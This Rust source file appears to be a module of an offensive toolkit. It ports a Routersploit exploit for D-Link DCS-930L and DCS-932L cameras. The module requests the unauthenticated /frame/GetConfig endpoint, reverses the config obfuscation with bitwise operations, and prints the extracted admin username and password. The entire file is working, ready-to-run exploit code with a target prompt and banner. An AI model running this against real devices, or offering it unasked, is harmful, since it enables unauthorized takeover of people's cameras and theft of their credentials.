use anyhow::{Result, Context};
use colored::*;
use reqwest::Client;
use std::time::Duration;
use crate::utils::{prompt_required, normalize_target};
use regex::Regex;

/// D-Link DCS Cameras Authentication Bypass
/// 
/// 1:1 Port from Routersploit (dlink_dcs_930l_auth_bypass.py)
/// Targets DCS-930L (v1.04) and DCS-932L (v1.02)
/// Vulnerability: Unauthenticated configuration disclosure via /frame/GetConfig
/// Logic: Retrieve obfuscated config, deobfuscate with bitwise ops, extract credentials.

pub async fn run(target: &str) -> Result<()> {
    print_banner();

    // Determine target URL
    let raw_ip = if target.is_empty() {
        prompt_required("Target IP")?
    } else {
        target.to_string()
    };
    let target_ip = normalize_target(&raw_ip)?;
    // Module default port is 8080 in python, but let's assume standard normalization handles ports? 
    // Utils `normalize_target` handles port logic if integrated, otherwise defaults to 80/443 logic usually?
    // User might need to specify port in target IP (e.g. 1.2.3.4:8080).
    // Let's assume user provides correct target string.
    let base_url = if target_ip.contains(':') {
        format!("http://{}", target_ip)
    } else {
        // Default to port 8080 as per python module suggestion? 
        // Or just standard http. Routersploit default is 8080 for this module.
        // Let's print a hint.
        println!("{} Note: Default target port for this device is often 8080. If it fails, try target as IP:8080", "[*]".blue());
        format!("http://{}:8080", target_ip)
    };
    
    println!("{} Target: {}", "[*]".blue(), base_url);

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(10))
        .build()?;

    let url = format!("{}/frame/GetConfig", base_url);
    println!("{} Retrieving configuration...", "[*]".blue());

    let res = client.get(&url)
        .send()
        .await
        .context("Failed to retrieve config")?;

    if res.status().is_success() {
        let bytes = res.bytes().await?;
        if bytes.is_empty() {
            println!("{} Empty response received.", "[-]".red());
            return Ok(());
        }

        println!("{} Response received ({} bytes). Deobfuscating...", "[*]".blue(), bytes.len());
        
        match deobfuscate(&bytes) {
            Some(config_str) => {
                // Check for AdminID/Password
                let mut found_creds = false;
                
                // Regex from python: r"AdminID=(.*)" and r"AdminPassword=(.*)"
                // Note: Rust regex doesn't support case insensitive flag inline (?i) easily at start if using simple search
                // but we can compile with Builder.
                let re_id = Regex::new(r"(?i)AdminID=(.*)")?;
                let re_pass = Regex::new(r"(?i)AdminPassword=(.*)")?;

                if let Some(caps) = re_id.captures(&config_str) {
                    if let Some(val) = caps.get(1) {
                        println!("{} Found Admin ID: {}", "[+]".green(), val.as_str().trim());
                        found_creds = true;
                    }
                }

                if let Some(caps) = re_pass.captures(&config_str) {
                    if let Some(val) = caps.get(1) {
                        println!("{} Found Admin Password: {}", "[+]".green(), val.as_str().trim());
                        found_creds = true;
                    }
                }
                
                if !found_creds {
                    println!("{} Config retrieved but no credentials found.", "[*]".yellow());
                    println!("{} Partial content:\n{}", "[*]".yellow(), &config_str.chars().take(200).collect::<String>());
                }
            },
            None => {
                println!("{} Deobfuscation failed (length mismatch or invalid format).", "[-]".red());
            }
        }
    } else {
        println!("{} Request failed with status: {}", "[-]".red(), res.status());
    }

    Ok(())
}

fn deobfuscate(config: &[u8]) -> Option<String> {
    // Port of `_deobfuscate` from Routersploit
    
    // Step 1: arr_c = [chain(...) for t in config]
    // Python chain:
    // lambda d: (d + ord('y')) & 0xff
    // lambda d: (d ^ ord('Z')) & 0xff
    // lambda d: (d - ord('e')) & 0xff
    
    let mut arr_c: Vec<u8> = config.iter().map(|&d| {
        let mut val = d;
        val = val.wrapping_add(b'y');
        val = val ^ b'Z';
        val = val.wrapping_sub(b'e');
        val
    }).collect();

    let arr_c_len = arr_c.len();
    if arr_c_len == 0 { return None; }
    
    // tmp = ((arr_c[arr_c_len - 1] & 7) << 5) & 0xff
    let tmp = ((arr_c[arr_c_len - 1] & 7) << 5) & 0xff;

    // Step 2: Reverse transformation
    // Python loop: for t in reversed(range(arr_c_len)):
    for t in (0..arr_c_len).rev() {
        let ct = if t == 0 {
            // ct = chain([lambda d: (d >> 3) & 0xff, lambda d: (d + tmp) & 0xff], arr_c[t])
            let val = arr_c[t];
            let v1 = (val >> 3) & 0xff;
            let v2 = v1.wrapping_add(tmp);
            v2
        } else {
            // ct = (((arr_c[t] >> 3) & 0xff) + (((arr_c[t - 1] & 0x7) << 5) & 0xff)) & 0xff
            let part1 = (arr_c[t] >> 3) & 0xff;
            let part2 = ((arr_c[t-1] & 0x7) << 5) & 0xff;
            (part1.wrapping_add(part2)) & 0xff
        };
        arr_c[t] = ct;
    }
    
    // Step 3: String manipulation (Interleave)
    // Python: tmp_str = "".join(map(chr, arr_c)) ...
    // Note: Config might contain non-utf8 chars initially? 
    // Usually config is ascii. Let's assume safe to treat as chars/bytes 1:1.
    
    if arr_c_len % 2 != 0 {
        return None;
    }
    
    let half_len = arr_c_len / 2;
    let mut ret_bytes = Vec::with_capacity(arr_c_len);
    
    // Python loop:
    // for i in range(half_str_len):
    //     ret_str += tmp_str[i + half_str_len] + tmp_str[i]
    
    for i in 0..half_len {
        ret_bytes.push(arr_c[i + half_len]);
        ret_bytes.push(arr_c[i]);
    }
    
    // Convert to String (lossy if needed)
    Some(String::from_utf8_lossy(&ret_bytes).to_string())
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║      D-Link DCS-930L Auth Bypass (Config Disclosure)      ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
